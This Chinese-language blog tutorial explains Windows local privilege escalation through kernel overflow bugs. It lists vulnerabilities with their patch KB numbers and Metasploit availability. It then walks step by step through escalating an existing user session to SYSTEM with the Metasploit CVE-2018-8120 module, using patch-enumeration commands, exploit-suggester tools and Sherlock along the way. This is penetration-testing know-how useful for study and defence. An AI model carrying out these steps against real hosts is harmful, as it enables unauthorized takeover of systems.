**目录**

[内核溢出漏洞提权](#t0)

[实战MSF中CVE-2018-8120模块本地溢出漏洞提权](#t1) 

[查看系统补丁](#t2)

[选择利用模块攻击](#t3)

* * *

内核溢出漏洞提权
========

本地溢出[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。以下是不同系统提权的漏洞和相应的补丁。

[github](https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020)上windows系统溢出漏洞提权的汇总：[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

| Windows Server 2003/xp | Windows Server 2008/7 | Windows Server 2012 |
| --- | --- | --- |
| 
**CVE-2018-8120(MS18-8120) |** **KB4131188**

**(MSF常用，有exe程序)**

 | 

**CVE-2018-8120(MS18-8120) |** **KB4131188**

**(MSF常用，有exe程序)**

 | 

**CVE-2018-8120(MS18-8120) |** **KB4131188**

**(MSF常用，有exe程序)**

 |
| 

**MS16-032 | KB3139914** 

**MSF中限32位机器，有exe程序**

 | 

**MS16-032 | KB3139914** 

**MSF中限32位机器，有exe程序**

 | 

**MS16-032 | KB3139914** 

**MSF中限32位机器，有exe程序**

 |
| 

MS15-097 | KB3079904

MSF中没有利用exploit

 | 

MS16-016 | KB3124280 

MSF限32位的Windows 7 SP1

 | 

MS15-097 | KB3079904

MSF中没有利用exploit

 |
| 

MS15-077 | KB3077657

MSF中没有利用exploit

 | 

MS16-014 | KB3134228 

MSF限32位的Windows 7 SP0/SP1

 | 

MS15-077 | KB3077657

MSF中没有利用exploit

 |
| 

**MS15-051 | KB3045171**

**MSF中限32位机器，有exe程序**

 | 

MS15-097 | KB3079904

MSF中没有利用exploit

 | 

**MS15-051 | KB3045171**

**MSF中限32位机器，有exe程序**

 |
| 

**MS14-058 | KB3000061**

**(CS中常用，MSF中只支持32位机器，有exe程序)**

 | 

MS15-077 | KB3077657

MSF中没有利用exploit

 | 

**MS14-058 | KB3000061**

**(CS中常用，MSF中只支持32位机器，有exe程序)**

 |
| 

MS13-046 | KB2829361

MSF中没有利用exploit

 | 

**MS15-051 | KB3045171**

**MSF中限32位机器，有exe程序**

 | 

MS13-046 | KB2829361

MSF中没有利用exploit

 |
| 

MS12-042 | KB2707511  sysret-pid

MSF中没有利用exploit

 | 

**MS14-058 | KB3000061**

**(CS中常用，MSF中只支持32位机器，有exe程序)**

 | 

MS12-042 | KB2707511  sysret-pid

MSF中没有利用exploit

 |
| 

MS12-020 | KB2621440

MSF中没有利用exploit

 | 

 **MS13-081|KB2870008**

MSF限32位的Windows 7 SP0/SP1

 | 

 |
| 

MS12-018 | KB2641653

MSF中没有利用exploit

 | 

MS13-046 | KB2829361

MSF中没有利用exploit

 | 

 |
| 

MS12-009 | KB2645640

MSF中没有利用exploit

 | 

MS13-053 | KB2850851  epathobj 

MSF限32位的Windows 7 SP0/SP1

 | 

 |
| 

MS12-003 | KB2646524

MSF中没有利用exploit

 | 

MS13-005 | KB2778930

MSF限32位的系统

 |   |
| 

MS11-097 | KB2620712

MSF中没有利用exploit

 | 

MS12-042 | KB2707511  sysret-pid

MSF中没有利用exploit

 |   |
| 

MS11-080 | KB2592799

**(MSF中只支持32位机器)**

 | 

MS11-080 | KB2592799

**(MSF中只支持32位机器)**

 |   |
| 

MS11-062 | KB2566454

MSF中没有利用exploit

 | 

MS10-092 |  KB2305420

MSF限32位的系统

 |   |
| 

MS11-056 | KB2507938

MSF中没有利用exploit

 |   |   |
| 

MS11-046 | KB2503665

MSF中没有利用exploit

 |   |   |
| 

MS11-014 | KB2478960

MSF中没有利用exploit

 |   |   |
| 

MS11-011 | KB2393802

MSF中没有利用exploit

 |   |   |
| 

MS10-084 | KB2360937

MSF中没有利用exploit

 |   |   |
| 

MS10-015 | KB977165  Ms Viru

MSF中只有Window2000SP4和win7 32位的exp

 |   |   |
| 

MS09-041 | KB971657

MSF中没有利用exploit

 |   |   |
| 

MS09-012 | KB952004 （PR提权）

MSF中没有利用exploit

 |   |   |
| 

MS09-012 | KB956572 （巴西烤肉提权)

MSF中没有利用exploit

 |   |   |

实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。在MSF中，最常用的提权模块是CVE-2018-8120；在CobaltStrike中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的exe程序。exe程序均支持32和64位的机器。

![](https://img-blog.csdnimg.cn/20191202150910637.png)

实战MSF中CVE-2018-8120模块本地溢出漏洞提权 
------------------------------

假设我们现在已经获得了一个Windows 2008 R2服务器的普通 xie [用户权限](https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020)，现在我们要利用CVE-2018-8120 提权至最高权限。

![](https://img-blog.csdnimg.cn/20191110104404857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **查看系统补丁**

**方法一：**输入shell进入到该主机的shell下，然后：systeminfo 查看系统详细信息，就可以看到补丁了

![](https://img-blog.csdnimg.cn/20191110104822601.png)

**方法二：**进入到 meterpreter 的shell下，执行 run  post/windows/gather/enum\_patches 可以直接查看哪些补丁没有打，但是由于这个模块还比较老，没有显示CVE-2018-8120的补丁号

![](https://img-blog.csdnimg.cn/20191202134851489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

MSF下还提供了 post/multi/recon/local\_exploit\_suggester 模块，该模块用于快速识别系统中可能被利用的漏洞

```
use post/multi/recon/local_exploit_suggester       
set lhost x.x.x.x      
set session 1      
exploit
```


![](https://img-blog.csdnimg.cn/20200212163309914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**方法三：**使用以下这条WMIC命令也可以查看补丁数量

```
wmic qfe get Caption,Description,HotFixID,InstalledOn      
#也可以直接找是否存在cve-2018-8120对应的KB4131188补丁      
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4131188"
```


![](https://img-blog.csdnimg.cn/20200212163002916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，目标主机只打了2个补丁，并没有 cve-2018-8120 对应的**KB4131188**补丁，所以我们可以利用 cve-2018-8120 进行提权。

**方法四**：Windows Exploit Suggester

该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。

```
#更新漏洞数据库，会生成一个xls的文件，如下 2020-02-12-mssb.xls      
python2 windows-exploit-suggester.py --update       
#查看目标主机系统信息，保存为sysinfo.txt文件      
systeminfo > sysinfo.txt       
#然后运行如下命令，查看该系统是否存在可利用的提权漏洞      
python2 windows-exploit-suggester.py -d 2020-02-12-mssb.xls -i sysinfo.txt
```


![](https://img-blog.csdnimg.cn/20200212164221695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**方法五**：Sherlock脚本

```
#搜索所有未安装的补丁      
Import-Module  .\Sherlock.ps1;Find-AllVulns      
#也可以搜索单个漏洞      
Import-Module  .\Sherlock.ps1;Find-MS14058
```


![](https://img-blog.csdnimg.cn/20200212164930753.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

###  选择利用模块攻击

首先，输入 background 退回到MSF下，然后 search  cve-2018-8120  ，可以看到找到了一个漏洞利用Exploit模块，我们使用该模块

```
use exploit/windows/local/ms18_8120_win32k_privesc
```


![](https://img-blog.csdnimg.cn/2019111010451777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

设置 session 为我们刚刚获得权限的 session ID，exploit 运行。可以看到，我们获得了 System 权限。

![](https://img-blog.csdnimg.cn/20191110104557450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)